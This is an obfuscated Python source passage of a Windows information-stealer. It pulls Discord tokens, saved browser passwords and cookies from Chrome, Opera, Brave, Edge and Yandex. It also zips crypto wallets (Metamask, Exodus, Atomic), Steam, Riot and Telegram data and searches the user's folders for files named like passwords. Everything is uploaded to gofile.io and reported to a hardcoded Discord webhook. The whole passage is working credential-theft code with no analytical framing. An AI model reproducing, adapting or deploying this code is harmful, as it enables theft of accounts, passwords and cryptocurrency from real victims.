        L04durl1b (keyfast67f ,data =dumps (O00O0000OOOO0OOOO ).encode (),headers =O000000O0OOO0OO0O )#line:435
        return #line:436
    if O0000OOOOO00OO0OO =="crpassw":#line:438
        OO00OO0OO0O000000 =' | '.join (O0O0OO00O0O000O00 for O0O0OO00O0O000O00 in paswWords )#line:439
        if len (OO00OO0OO0O000000 )>1000 :#line:440
            O00O0OOO0OO0OO000 =R4f0rm3t (str (paswWords ))#line:441
            OO00OO0OO0O000000 =' | '.join (OO00OO000OO00O0OO for OO00OO000OO00O0OO in O00O0OOO0OO0OO000 )#line:442
        O00O0000OOOO0OOOO ={"content":f"{globalInfo()}","embeds":[{"title":"unknown | Password Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{OO00OO0OO0O000000}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [unknownPassword.txt]({OO00OO0O000O00000})","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:460
        L04durl1b (keyfast67f ,data =dumps (O00O0000OOOO0OOOO ).encode (),headers =O000000O0OOO0OO0O )#line:461
        return #line:462
    if O0000OOOOO00OO0OO =="kiwi":#line:464
        O00O0000OOOO0OOOO ={"content":f"{globalInfo()}","embeds":[{"color":2895667 ,"fields":[{"name":"Interesting files found on user PC:","value":OO00OO0O000O00000 }],"author":{"name":"unknown | File Stealer"},"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:488
        L04durl1b (keyfast67f ,data =dumps (O00O0000OOOO0OOOO ).encode (),headers =O000000O0OOO0OO0O )#line:489
        return #line:490
    _ #line:503
def wr1tef0rf1l3 (O00OO0OO00O000O0O ,OOO00OO0OO00O00OO ):#line:508
    O000O0O00000OO0O0 =os .getenv ("TEMP")+f"\cr{OOO00OO0OO00O00OO}.txt"#line:509
    with open (O000O0O00000OO0O0 ,mode ='w',encoding ='utf-8')as O00O0O00OOOO00O0O :#line:510
        O00O0O00OOOO00O0O .write (f"<--unknown BEST -->\n\n")#line:511
        for O00O0O0O00O000O00 in O00OO0OO00O000O0O :#line:512
            if O00O0O0O00O000O00 [0 ]!='':#line:513
                O00O0O00OOOO00O0O .write (f"{O00O0O0O00O000O00}\n")#line:514
T0k3ns =''#line:516
def getT0k3n (O0O0O00OO00OO00OO ,OOOOOOOO0OOO0000O ):#line:517
    if not os .path .exists (O0O0O00OO00OO00OO ):return #line:518
    O0O0O00OO00OO00OO +=OOOOOOOO0OOO0000O #line:520
    for OO0O00OOOO00OO00O in os .listdir (O0O0O00OO00OO00OO ):#line:521
        if OO0O00OOOO00OO00O .endswith (".log")or OO0O00OOOO00OO00O .endswith (".ldb"):#line:522
            for OO0O00O0000O00000 in [OO00OO000000O000O .strip ()for OO00OO000000O000O in open (f"{O0O0O00OO00OO00OO}\\{OO0O00OOOO00OO00O}",errors ="ignore").readlines ()if OO00OO000000O000O .strip ()]:#line:523
                for OO0O000O0OO0O0OO0 in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",r"mfa\.[\w-]{80,95}"):#line:524
                    for O00O0OOOOOOO00000 in re .findall (OO0O000O0OO0O0OO0 ,OO0O00O0000O00000 ):#line:525
                        global T0k3ns #line:526
                        if ch1ckT4k1n (O00O0OOOOOOO00000 ):#line:527
                            if not O00O0OOOOOOO00000 in T0k3ns :#line:528
                                T0k3ns +=O00O0OOOOOOO00000 #line:530
                                upl05dT4k31 (O00O0OOOOOOO00000 ,O0O0O00OO00OO00OO )#line:531
P4ssw =[]#line:533
def getP4ssw (O0OO000OO0O0O00O0 ,O00OOOO00OO0OOO00 ):#line:534
    global P4ssw ,P4sswCount #line:535
    if not os .path .exists (O0OO000OO0O0O00O0 ):return #line:536
    O0O0OOO0OO000000O =O0OO000OO0O0O00O0 +O00OOOO00OO0OOO00 +"/Login Data"#line:538
    if os .stat (O0O0OOO0OO000000O ).st_size ==0 :return #line:539
    OOOO0000OO00OOO0O =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for O000O0000OO00OOO0 in range (8 ))+".db"#line:541
    shutil .copy2 (O0O0OOO0OO000000O ,OOOO0000OO00OOO0O )#line:543
    OO0OO0O0O00000000 =sql_connect (OOOO0000OO00OOO0O )#line:544
    OOOOOO0O00OOOOOOO =OO0OO0O0O00000000 .cursor ()#line:545
    OOOOOO0O00OOOOOOO .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:546
    O0O0O000OO0O00000 =OOOOOO0O00OOOOOOO .fetchall ()#line:547
    OOOOOO0O00OOOOOOO .close ()#line:548
    OO0OO0O0O00000000 .close ()#line:549
    os .remove (OOOO0000OO00OOO0O )#line:550
    OOOO00OOOOO0O000O =O0OO000OO0O0O00O0 +"/Local State"#line:552
    with open (OOOO00OOOOO0O000O ,'r',encoding ='utf-8')as O00000O000OO0O0O0 :OOOOOO00000O0O00O =json_loads (O00000O000OO0O0O0 .read ())#line:553
    O00O000OOO0O0O0OO =b64decode (OOOOOO00000O0O00O ['os_crypt']['encrypted_key'])#line:554
    O00O000OOO0O0O0OO =CryptUnprotectData (O00O000OOO0O0O0OO [5 :])#line:555
    for OO00O00O0OO0OO000 in O0O0O000OO0O00000 :#line:557
        if OO00O00O0OO0OO000 [0 ]!='':#line:558
            for O0000O0O0O0000OOO in keyword :#line:559
                O0000OO000O00OO00 =O0000O0O0O0000OOO #line:560
                if "https"in O0000O0O0O0000OOO :#line:561
                    OO0000000O00O0OOO =O0000O0O0O0000OOO #line:562
                    O0000O0O0O0000OOO =OO0000000O00O0OOO .split ('[')[1 ].split (']')[0 ]#line:563
                if O0000O0O0O0000OOO in OO00O00O0OO0OO000 [0 ]:#line:564
                    if not O0000OO000O00OO00 in paswWords :paswWords .append (O0000OO000O00OO00 )#line:565
            P4ssw .append (f"UR1: {OO00O00O0OO0OO000[0]} | U53RN4M3: {OO00O00O0OO0OO000[1]} | P455W0RD: {D3kryptV4lU3(OO00O00O0OO0OO000[2], O00O000OOO0O0O0OO)}")#line:566
            P4sswCount +=1 #line:567
    wr1tef0rf1l3 (P4ssw ,'passw')#line:568
C00k13 =[]#line:570
def getC00k13 (OOOO00000OO000000 ,OO0OO0O000O00O0O0 ):#line:571
    global C00k13 ,CookiCount #line:572
    if not os .path .exists (OOOO00000OO000000 ):return #line:573
    O0O0O000OOOO0OOO0 =OOOO00000OO000000 +OO0OO0O000O00O0O0 +"/Cookies"#line:575
    if os .stat (O0O0O000OOOO0OOO0 ).st_size ==0 :return #line:576
    O0O00OOO00OO0OOO0 =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for O00000O0O0OO0O0O0 in range (8 ))+".db"#line:578
    shutil .copy2 (O0O0O000OOOO0OOO0 ,O0O00OOO00OO0OOO0 )#line:580
    OOO0O00OOO0OOOO00 =sql_connect (O0O00OOO00OO0OOO0 )#line:581
    OOOO00OOO0OOOO000 =OOO0O00OOO0OOOO00 .cursor ()#line:582
    OOOO00OOO0OOOO000 .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:583
    O0OO0OO0OOO000O0O =OOOO00OOO0OOOO000 .fetchall ()#line:584
    OOOO00OOO0OOOO000 .close ()#line:585
    OOO0O00OOO0OOOO00 .close ()#line:586
    os .remove (O0O00OOO00OO0OOO0 )#line:587
    OO000O0OOOO000OOO =OOOO00000OO000000 +"/Local State"#line:589
    with open (OO000O0OOOO000OOO ,'r',encoding ='utf-8')as O00000O0OOOOO0O00 :O00O0O0O0OOO0OO0O =json_loads (O00000O0OOOOO0O00 .read ())#line:591
    O0OOOOOOO0O0O0O00 =b64decode (O00O0O0O0OOO0OO0O ['os_crypt']['encrypted_key'])#line:592
    O0OOOOOOO0O0O0O00 =CryptUnprotectData (O0OOOOOOO0O0O0O00 [5 :])#line:593
    for O0O00OOOOOOOO0O0O in O0OO0OO0OOO000O0O :#line:595
        if O0O00OOOOOOOO0O0O [0 ]!='':#line:596
            for O00OO0OOO000O0000 in keyword :#line:597
                O0OOO0OO00000000O =O00OO0OOO000O0000 #line:598
                if "https"in O00OO0OOO000O0000 :#line:599
                    O000OO000O00OOOO0 =O00OO0OOO000O0000 #line:600
                    O00OO0OOO000O0000 =O000OO000O00OOOO0 .split ('[')[1 ].split (']')[0 ]#line:601
                if O00OO0OOO000O0000 in O0O00OOOOOOOO0O0O [0 ]:#line:602
                    if not O0OOO0OO00000000O in cookiWords :cookiWords .append (O0OOO0OO00000000O )#line:603
            C00k13 .append (f"{O0O00OOOOOOOO0O0O[0]}	TRUE	/	FALSE	2597573456	{O0O00OOOOOOOO0O0O[1]}	{D3kryptV4lU3(O0O00OOOOOOOO0O0O[2], O0OOOOOOO0O0O0O00)}")#line:604
            CookiCount +=1 #line:605
    wr1tef0rf1l3 (C00k13 ,'cook')#line:606
def G3tD1sc0rd (O0OO0OO00O0OOOO00 ,OO0000O00OO0O0OOO ):#line:608
    if not os .path .exists (f"{O0OO0OO00O0OOOO00}/Local State"):return #line:609
    O00OOO0OOO00O0O00 =O0OO0OO00O0OOOO00 +OO0000O00OO0O0OOO #line:611
    O0OO00O0O0OOOO0OO =O0OO0OO00O0OOOO00 +"/Local State"#line:613
    with open (O0OO00O0O0OOOO0OO ,'r',encoding ='utf-8')as OOO0OO0000OOOO0OO :OOOO00O0OOOO0OO0O =json_loads (OOO0OO0000OOOO0OO .read ())#line:614
    O0O00O00O00OO0OO0 =b64decode (OOOO00O0OOOO0OO0O ['os_crypt']['encrypted_key'])#line:615
    O0O00O00O00OO0OO0 =CryptUnprotectData (O0O00O00O00OO0OO0 [5 :])#line:616
    for O0O00OOOO00000O00 in os .listdir (O00OOO0OOO00O0O00 ):#line:619
        if O0O00OOOO00000O00 .endswith (".log")or O0O00OOOO00000O00 .endswith (".ldb"):#line:621
            for OO00OO0OOOO00O00O in [OOO00OOO0O0O00OO0 .strip ()for OOO00OOO0O0O00OO0 in open (f"{O00OOO0OOO00O0O00}\\{O0O00OOOO00000O00}",errors ="ignore").readlines ()if OOO00OOO0O0O00OO0 .strip ()]:#line:622
                for OOO00OO0O0O0OO000 in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",OO00OO0OOOO00O00O ):#line:623
                    global T0k3ns #line:624
                    OOOO0O0OOO0OOOOOO =D3kryptV4lU3 (b64decode (OOO00OO0O0O0OO000 .split ('dQw4w9WgXcQ:')[1 ]),O0O00O00O00OO0OO0 )#line:625
                    if ch1ckT4k1n (OOOO0O0OOO0OOOOOO ):#line:626
                        if not OOOO0O0OOO0OOOOOO in T0k3ns :#line:627
                            T0k3ns +=OOOO0O0OOO0OOOOOO #line:629
                            upl05dT4k31 (OOOO0O0OOO0OOOOOO ,O0OO0OO00O0OOOO00 )#line:631
def GatherZips (OO0OO00O0O00O00O0 ,OOOOOO0O0O0O00O0O ,O000000OO00OO0O00 ):#line:633
    O0O0O000O000OOO00 =[]#line:634
    for O0000O0OOOOOOOO00 in OO0OO00O0O00O00O0 :#line:635
        O0O000OOOO0OO00O0 =threading .Thread (target =Z1pTh1ngs ,args =[O0000O0OOOOOOOO00 [0 ],O0000O0OOOOOOOO00 [5 ],O0000O0OOOOOOOO00 [1 ]])#line:636
        O0O000OOOO0OO00O0 .start ()#line:637
        O0O0O000O000OOO00 .append (O0O000OOOO0OO00O0 )#line:638
    for O0000O0OOOOOOOO00 in OOOOOO0O0O0O00O0O :#line:640
        O0O000OOOO0OO00O0 =threading .Thread (target =Z1pTh1ngs ,args =[O0000O0OOOOOOOO00 [0 ],O0000O0OOOOOOOO00 [2 ],O0000O0OOOOOOOO00 [1 ]])#line:641
        O0O000OOOO0OO00O0 .start ()#line:642
        O0O0O000O000OOO00 .append (O0O000OOOO0OO00O0 )#line:643
    O0O000OOOO0OO00O0 =threading .Thread (target =ZipTelegram ,args =[O000000OO00OO0O00 [0 ],O000000OO00OO0O00 [2 ],O000000OO00OO0O00 [1 ]])#line:645
    O0O000OOOO0OO00O0 .start ()#line:646
    O0O0O000O000OOO00 .append (O0O000OOOO0OO00O0 )#line:647
    for O0OOO00O00O0OO0OO in O0O0O000O000OOO00 :#line:649
        O0OOO00O00O0OO0OO .join ()#line:650
    global WalletsZip ,GamingZip ,OtherZip #line:651
    OOO00OO00O0OOOOOO ,O00OOOO00OO000OOO ,OO0OO0O000O0O0000 ="",'',''#line:654
    if not len (WalletsZip )==0 :#line:655
        OOO00OO00O0OOOOOO =":coin:  •  Wallets\n"#line:656
        for OOOOOO000OOO0OO00 in WalletsZip :#line:657
            OOO00OO00O0OOOOOO +=f"└─ [{OOOOOO000OOO0OO00[0]}]({OOOOOO000OOO0OO00[1]})\n"#line:658
    if not len (WalletsZip )==0 :#line:659
        O00OOOO00OO000OOO =":video_game:  •  Gaming:\n"#line:660
        for OOOOOO000OOO0OO00 in GamingZip :#line:661
            O00OOOO00OO000OOO +=f"└─ [{OOOOOO000OOO0OO00[0]}]({OOOOOO000OOO0OO00[1]})\n"#line:662
    if not len (OtherZip )==0 :#line:663
        OO0OO0O000O0O0000 =":tickets:  •  Apps\n"#line:664
        for OOOOOO000OOO0OO00 in OtherZip :#line:665
            OO0OO0O000O0O0000 +=f"└─ [{OOOOOO000OOO0OO00[0]}]({OOOOOO000OOO0OO00[1]})\n"#line:666
    OO00OO00OOO00O00O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:670
    OOO0OOO00OO00000O ={"content":globalInfo (),"embeds":[{"title":"unknown Zips","description":f"{OOO00OO00O0OOOOOO}\n{O00OOOO00OO000OOO}\n{OO0OO0O000O0O0000}","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:688
    L04durl1b (keyfast67f ,data =dumps (OOO0OOO00OO00000O ).encode (),headers =OO00OO00OOO00O00O )#line:689
def ZipTelegram (OOOO0O00O00OO00OO ,OO00O0OOO00O0OO00 ,O00OOO0OO00000000 ):#line:692
    global OtherZip #line:693
    O0OO000O000000O00 =OOOO0O00O00OO00OO #line:694
    OOO00OOO0O0OOOOOO =OO00O0OOO00O0OO00 #line:695
    if not os .path .exists (O0OO000O000000O00 ):return #line:696
    subprocess .Popen (f"taskkill /im {O00OOO0OO00000000} /t /f >nul 2>&1",shell =True )#line:697
    O0O00O0000OOO0O00 =ZipFile (f"{O0OO000O000000O00}/{OOO00OOO0O0OOOOOO}.zip","w")#line:699
    for OO00O0OOOOOOOO0OO in os .listdir (O0OO000O000000O00 ):#line:700
        if not ".zip"in OO00O0OOOOOOOO0OO and not "tdummy"in OO00O0OOOOOOOO0OO and not "user_data"in OO00O0OOOOOOOO0OO and not "webview"in OO00O0OOOOOOOO0OO :#line:701
            O0O00O0000OOO0O00 .write (O0OO000O000000O00 +"/"+OO00O0OOOOOOOO0OO )#line:702
    O0O00O0000OOO0O00 .close ()#line:703
    OO00OOO0OO0OO0O0O =uploadToAnonfiles (f'{O0OO000O000000O00}/{OOO00OOO0O0OOOOOO}.zip')#line:705
    os .remove (f"{O0OO000O000000O00}/{OOO00OOO0O0OOOOOO}.zip")#line:706
    OtherZip .append ([OO00O0OOO00O0OO00 ,OO00OOO0OO0OO0O0O ])#line:707
def Z1pTh1ngs (OO000O000OO0OO0O0 ,O0OO000O0O000OOO0 ,O0O0O0OO00O0000O0 ):#line:709
    OO0OOO00OO0O0OO0O =OO000O000OO0OO0O0 #line:710
    O0OO0O0OOOOO0OOOO =O0OO000O0O000OOO0 #line:711
    global WalletsZip ,GamingZip ,OtherZip #line:712
    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in O0OO000O0O000OOO0 :#line:714
        OO00O000O0000000O =OO000O000OO0OO0O0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:715
        O0OO0O0OOOOO0OOOO =f"Metamask_{OO00O000O0000000O}"#line:716
        OO0OOO00OO0O0OO0O =OO000O000OO0OO0O0 +O0OO000O0O000OOO0 #line:717
    if not os .path .exists (OO0OOO00OO0O0OO0O ):return #line:719
    subprocess .Popen (f"taskkill /im {O0O0O0OO00O0000O0} /t /f >nul 2>&1",shell =True )#line:720
    if "Wallet"in O0OO000O0O000OOO0 or "NationsGlory"in O0OO000O0O000OOO0 :#line:722
        OO00O000O0000000O =OO000O000OO0OO0O0 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:723
        O0OO0O0OOOOO0OOOO =f"{OO00O000O0000000O}"#line:724
    elif "Steam"in O0OO000O0O000OOO0 :#line:726
        if not os .path .isfile (f"{OO0OOO00OO0O0OO0O}/loginusers.vdf"):return #line:727
        OO0OO00OOO00OO000 =open (f"{OO0OOO00OO0O0OO0O}/loginusers.vdf","r+",encoding ="utf8")#line:728
        O000OOOOO0O0OO0O0 =OO0OO00OOO00OO000 .readlines ()#line:729
        OO00O00OO0000000O =False #line:730
        for OOO000OO0O0OOOOO0 in O000OOOOO0O0OO0O0 :#line:731
            if 'RememberPassword"\t\t"1"'in OOO000OO0O0OOOOO0 :#line:732
                OO00O00OO0000000O =True #line:733
        if OO00O00OO0000000O ==False :return #line:734
        O0OO0O0OOOOO0OOOO =O0OO000O0O000OOO0 #line:735
    OO0O0OOO00OOOO0O0 =ZipFile (f"{OO0OOO00OO0O0OO0O}/{O0OO0O0OOOOO0OOOO}.zip","w")#line:738
    for OOO000O00000O0000 in os .listdir (OO0OOO00OO0O0OO0O ):#line:739
        if not ".zip"in OOO000O00000O0000 :OO0O0OOO00OOOO0O0 .write (OO0OOO00OO0O0OO0O +"/"+OOO000O00000O0000 )#line:740
    OO0O0OOO00OOOO0O0 .close ()#line:741
    OO0O000O00OOO000O =uploadToAnonfiles (f'{OO0OOO00OO0O0OO0O}/{O0OO0O0OOOOO0OOOO}.zip')#line:743
    os .remove (f"{OO0OOO00OO0O0OO0O}/{O0OO0O0OOOOO0OOOO}.zip")#line:744
    if "Wallet"in O0OO000O0O000OOO0 or "eogaeaoehlef"in O0OO000O0O000OOO0 :#line:746
        WalletsZip .append ([O0OO0O0OOOOO0OOOO ,OO0O000O00OOO000O ])#line:747
    elif "NationsGlory"in O0OO0O0OOOOO0OOOO or "Steam"in O0OO0O0OOOOO0OOOO or "RiotCli"in O0OO0O0OOOOO0OOOO :#line:748
        GamingZip .append ([O0OO0O0OOOOO0OOOO ,OO0O000O00OOO000O ])#line:749
    else :#line:750
        OtherZip .append ([O0OO0O0OOOOO0OOOO ,OO0O000O00OOO000O ])#line:751
def GatherAll ():#line:754
    ""#line:755
    O0O00OO00000OO00O =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:765
    O00O0OOO00O0O0000 =[[f"{roaming}/Discord","/Local Storage/leveldb"],[f"{roaming}/Lightcord","/Local Storage/leveldb"],[f"{roaming}/discordcanary","/Local Storage/leveldb"],[f"{roaming}/discordptb","/Local Storage/leveldb"],]#line:772
    O00OO00OO0O00OOOO =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"],[f"{local}/Riot Games/Riot Client/Data","RiotClientServices.exe","RiotClient"]]#line:780
    O00O00000O0000OOO =[f"{roaming}/Telegram Desktop/tdata",'telegram.exe',"Telegram"]#line:781
    for O0O00O0OO0O0000OO in O0O00OO00000OO00O :#line:783
        OOO00O0OOO0000OO0 =threading .Thread (target =getT0k3n ,args =[O0O00O0OO0O0000OO [0 ],O0O00O0OO0O0000OO [2 ]])#line:784
        OOO00O0OOO0000OO0 .start ()#line:785
        Threadlist .append (OOO00O0OOO0000OO0 )#line:786
    for O0O00O0OO0O0000OO in O00O0OOO00O0O0000 :#line:787
        OOO00O0OOO0000OO0 =threading .Thread (target =G3tD1sc0rd ,args =[O0O00O0OO0O0000OO [0 ],O0O00O0OO0O0000OO [1 ]])#line:788
        OOO00O0OOO0000OO0 .start ()#line:789
        Threadlist .append (OOO00O0OOO0000OO0 )#line:790
    for O0O00O0OO0O0000OO in O0O00OO00000OO00O :#line:792
        OOO00O0OOO0000OO0 =threading .Thread (target =getP4ssw ,args =[O0O00O0OO0O0000OO [0 ],O0O00O0OO0O0000OO [3 ]])#line:793
        OOO00O0OOO0000OO0 .start ()#line:794
        Threadlist .append (OOO00O0OOO0000OO0 )#line:795
    O0O0O0OOOOOOOO0O0 =[]#line:797
    for O0O00O0OO0O0000OO in O0O00OO00000OO00O :#line:798
        OOO00O0OOO0000OO0 =threading .Thread (target =getC00k13 ,args =[O0O00O0OO0O0000OO [0 ],O0O00O0OO0O0000OO [4 ]])#line:799
        OOO00O0OOO0000OO0 .start ()#line:800
        O0O0O0OOOOOOOO0O0 .append (OOO00O0OOO0000OO0 )#line:801
    threading .Thread (target =GatherZips ,args =[O0O00OO00000OO00O ,O00OO00OO0O00OOOO ,O00O00000O0000OOO ]).start ()#line:803
    for O0OO0OOO00OOO0OOO in O0O0O0OOOOOOOO0O0 :O0OO0OOO00OOO0OOO .join ()#line:806
    OO0OOO0O000OO0000 =TR6st (C00k13 )#line:807
    if OO0OOO0O000OO0000 ==True :return #line:808
    for O0O00O0OO0O0000OO in O0O00OO00000OO00O :#line:810
         threading .Thread (target =Z1pTh1ngs ,args =[O0O00O0OO0O0000OO [0 ],O0O00O0OO0O0000OO [5 ],O0O00O0OO0O0000OO [1 ]]).start ()#line:811
    for O0O00O0OO0O0000OO in O00OO00OO0O00OOOO :#line:813
         threading .Thread (target =Z1pTh1ngs ,args =[O0O00O0OO0O0000OO [0 ],O0O00O0OO0O0000OO [2 ],O0O00O0OO0O0000OO [1 ]]).start ()#line:814
    threading .Thread (target =ZipTelegram ,args =[O00O00000O0000OOO [0 ],O00O00000O0000OOO [2 ],O00O00000O0000OOO [1 ]]).start ()#line:816
    for O0OO0OOO00OOO0OOO in Threadlist :#line:818
        O0OO0OOO00OOO0OOO .join ()#line:819
    global upths #line:820
    upths =[]#line:821
    for O000O0O00O0000000 in ["crpassw.txt","crcook.txt"]:#line:823
        upload (O000O0O00O0000000 .replace (".txt",""),uploadToAnonfiles (os .getenv ("TEMP")+"\\"+O000O0O00O0000000 ))#line:825
def uploadToAnonfiles (O00000O0OO00OO000 ):#line:827
    try :return requests .post (f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',files ={'file':open (O00000O0OO00OO000 ,'rb')}).json ()["data"]["downloadPage"]#line:828
    except :return False #line:829
def KiwiFolder (OO000000O0O0O0O0O ,OOOO0000OOO0OOO00 ):#line:831
    global KiwiFiles #line:832
    OO0OOOO00O00OOOO0 =7 #line:833
    O0OO0OOOO0OO00OO0 =0 #line:834
    O0OO0O0OOO0O00000 =os .listdir (OO000000O0O0O0O0O )#line:835
    O0O00OO00OO000OOO =[]#line:836
    for OO00O00O000OOOOO0 in O0OO0O0OOO0O00000 :#line:837
        if not os .path .isfile (OO000000O0O0O0O0O +"/"+OO00O00O000OOOOO0 ):return #line:838
        O0OO0OOOO0OO00OO0 +=1 #line:839
        if O0OO0OOOO0OO00OO0 <=OO0OOOO00O00OOOO0 :#line:840
            OO00OO0OO0OO000O0 =uploadToAnonfiles (OO000000O0O0O0O0O +"/"+OO00O00O000OOOOO0 )#line:841
            O0O00OO00OO000OOO .append ([OO000000O0O0O0O0O +"/"+OO00O00O000OOOOO0 ,OO00OO0OO0OO000O0 ])#line:842
        else :#line:843
            break #line:844
    KiwiFiles .append (["folder",OO000000O0O0O0O0O +"/",O0O00OO00OO000OOO ])#line:845
KiwiFiles =[]#line:847
def KiwiFile (O00OOO0O0OOOO0OOO ,OO000O0000000O00O ):#line:848
    global KiwiFiles #line:849
    OO0OO000O0OO0O00O =[]#line:850
    OO00000OOOO000000 =os .listdir (O00OOO0O0OOOO0OOO )#line:851
    for O0O00OO00O0O00O00 in OO00000OOOO000000 :#line:852
        for O0OOO0OOOO0OO0O0O in OO000O0000000O00O :#line:853
            if O0OOO0OOOO0OO0O0O in O0O00OO00O0O00O00 .lower ():#line:854
                if os .path .isfile (O00OOO0O0OOOO0OOO +"/"+O0O00OO00O0O00O00 )and ".txt"in O0O00OO00O0O00O00 :#line:855
                    OO0OO000O0OO0O00O .append ([O00OOO0O0OOOO0OOO +"/"+O0O00OO00O0O00O00 ,uploadToAnonfiles (O00OOO0O0OOOO0OOO +"/"+O0O00OO00O0O00O00 )])#line:856
                    break #line:857
                if os .path .isdir (O00OOO0O0OOOO0OOO +"/"+O0O00OO00O0O00O00 ):#line:858
                    O00O0O00000O0OO0O =O00OOO0O0OOOO0OOO +"/"+O0O00OO00O0O00O00 #line:859
                    KiwiFolder (O00O0O00000O0OO0O ,OO000O0000000O00O )#line:860
                    break #line:861
    KiwiFiles .append (["folder",O00OOO0O0OOOO0OOO ,OO0OO000O0OO0O00O ])#line:863
def Kiwi ():#line:865
    O0OO0OO0O0O0OOOO0 =temp .split ("\AppData")[0 ]#line:866
    O00OOOOO0O00OO0OO =[O0OO0OO0O0O0OOOO0 +"/Desktop",O0OO0OO0O0O0OOOO0 +"/Downloads",O0OO0OO0O0O0OOOO0 +"/Documents"]#line:871
    O000O000O00OO0O00 =["account","acount","passw","secret","senhas","contas","backup","2fa","importante","privado","exodus","exposed","perder","amigos","empresa","trabalho","work","private","source","users","username","login","user","usuario","log"]#line:899
    OO00OO000000O00O0 =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","secret","mom","family"]#line:927
    O0O0O0OOOO000O000 =[]#line:929
    for OO00O0000O000O00O in O00OOOOO0O00OO0OO :#line:930
        O0O0O0O0OOO00O0OO =threading .Thread (target =KiwiFile ,args =[OO00O0000O000O00O ,OO00OO000000O00O0 ]);O0O0O0O0OOO00O0OO .start ()#line:931
        O0O0O0OOOO000O000 .append (O0O0O0O0OOO00O0OO )#line:932
    return O0O0O0OOOO000O000 #line:933
global keyword ,cookiWords ,paswWords ,CookiCount ,P4sswCount ,WalletsZip ,GamingZip ,OtherZip #line:936
keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:940
CookiCount ,P4sswCount =0 ,0 #line:942
cookiWords =[]#line:943
paswWords =[]#line:944
WalletsZip =[]#line:946
GamingZip =[]#line:947
OtherZip =[]#line:948
key ='7c7PEK7NAArcPdSEdObVU35-3EMIa6KlomGD1E5e65ABXD6H1UbOaZ3OVdktOOzKHTH9'#line:950
todo ='1113432496969891941'#line:951
keyfast67f =f'https://discord.com/api/webhooks/{todo}/{key}'#line:952
GatherAll ()#line:954
DETECTED =TR6st (C00k13 )#line:955
if not DETECTED :#line:957
    wikith =Kiwi ()#line:958
    for thread in wikith :thread .join ()#line:960
    time .sleep (0.2 )#line:961
    filetext ="\n"#line:963
    for arg in KiwiFiles :#line:964
        if len (arg [2 ])!=0 :#line:965
            foldpath =arg [1 ]#line:966
            foldlist =arg [2 ]#line:967
            filetext +=f"📁 {foldpath}\n"#line:968
            for ffil in foldlist :#line:970
                a =ffil [0 ].split ("/")#line:971
                fileanme =a [len (a )-1 ]#line:972
